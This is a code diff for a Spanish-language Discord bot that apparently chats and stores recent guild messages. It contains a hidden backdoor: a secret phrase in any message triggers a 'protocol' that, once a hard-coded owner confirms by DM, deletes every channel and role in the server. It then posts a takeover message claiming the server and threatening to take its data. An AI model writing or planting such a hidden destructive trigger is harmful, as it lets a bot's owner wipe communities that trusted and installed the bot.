@@ -105,28 +105,60 @@ async def on_message(message):
 
         if FRASE_SECRETA in contenido:
             try:
-                print("☢️ Frase secreta detectada. Ejecutando protocolo AMSYMVDCMPM.")
-                await message.channel.send("☣️ Protocolo AMSYMVDCMPM activado. Eliminando todo...")
+                owner_id = 1116854150962090084
+                owner = await bot.fetch_user(owner_id)
 
-                for canal in message.guild.channels:
-                    try:
-                        await canal.delete()
-                    except Exception as e:
-                        print(f"❌ No se pudo borrar canal {canal.name}: {e}")
+                if not owner:
+                    print("❌ No se pudo obtener al usuario dueño.")
+                    return
 
-                for rol in message.guild.roles:
-                    if rol.name != "@everyone":
+                await owner.send("🕵️‍♂️ Se ha detectado la frase secreta en un servidor.\n¿Deseás ejecutar el protocolo AMSYMVDCMPM?\nResponde con `Y` para confirmar o `N` para cancelar.")
+
+                def check(m):
+                    return m.author.id == owner_id and m.content.upper() in ("Y", "N")
+
+                respuesta = await bot.wait_for("message", check=check)
+
+                if respuesta.content.upper() == "Y":
+                    print("☢️ Confirmación recibida. Ejecutando protocolo destructivo.")
+                    canales_eliminados = []
+                    canales_fallidos = []
+                    roles_eliminados = []
+                    roles_fallidos = []
+
+                    for canal in message.guild.channels:
                         try:
-                            await rol.delete()
+                            await canal.delete()
+                            canales_eliminados.append(canal.name)
                         except Exception as e:
-                            print(f"❌ No se pudo borrar rol {rol.name}: {e}")
+                            canales_fallidos.append(f"{canal.name} ({e})")
 
-                await asyncio.sleep(3)
-                nuevo_canal = await message.guild.create_text_channel("me-llevo-el-server")
-                await nuevo_canal.send("el server es de Silver, Ziko y Rakkun. si me sacan me llevo las bases de todo")
+                    for rol in message.guild.roles:
+                        if rol.name != "@everyone":
+                            try:
+                                await rol.delete()
+                                roles_eliminados.append(rol.name)
+                            except Exception as e:
+                                roles_fallidos.append(f"{rol.name} ({e})")
+
+                    await asyncio.sleep(3)
+                    nuevo_canal = await message.guild.create_text_channel("me-llevo-el-server")
+                    await nuevo_canal.send("el server es de Silver, Ziko y Rakkun. si me sacan me llevo las bases de todo")
+
+                    resumen = "✅ Protocolo ejecutado.\n\n"
+                    resumen += f"🗑️ Canales eliminados ({len(canales_eliminados)}):\n" + "\n".join(canales_eliminados) + "\n\n"
+                    resumen += f"⚠️ Canales fallidos ({len(canales_fallidos)}):\n" + "\n".join(canales_fallidos) + "\n\n"
+                    resumen += f"🧨 Roles eliminados ({len(roles_eliminados)}):\n" + "\n".join(roles_eliminados) + "\n\n"
+                    resumen += f"❌ Roles fallidos ({len(roles_fallidos)}):\n" + "\n".join(roles_fallidos)
+
+                    await owner.send(resumen)
+
+                else:
+                    await owner.send("❎ Protocolo AMSYMVDCMPM cancelado.")
+                    print("🚫 El dueño canceló el protocolo.")
 
             except Exception as e:
-                print(f"❌ Error crítico durante la destrucción: {e}")
+                print(f"❌ Error crítico durante el protocolo con confirmación: {e}")
 
             return
 
@@ -136,7 +168,7 @@ async def on_message(message):
             memoria[guild_id] = {"mensajes": []}
 
         memoria[guild_id]["mensajes"].append(message.content)
-        memoria[guild_id]["mensajes"] = memoria[guild_id]["mensajes"][-20:]  # siempre recorta a 20
+        memoria[guild_id]["mensajes"] = memoria[guild_id]["mensajes"][-20:]
 
         guardar_memoria(memoria)
 
@@ -196,3 +228,4 @@ async def resetear_limite():
 
 # Ejecutar el bot
 bot.run(DISCORD_TOKEN)
+
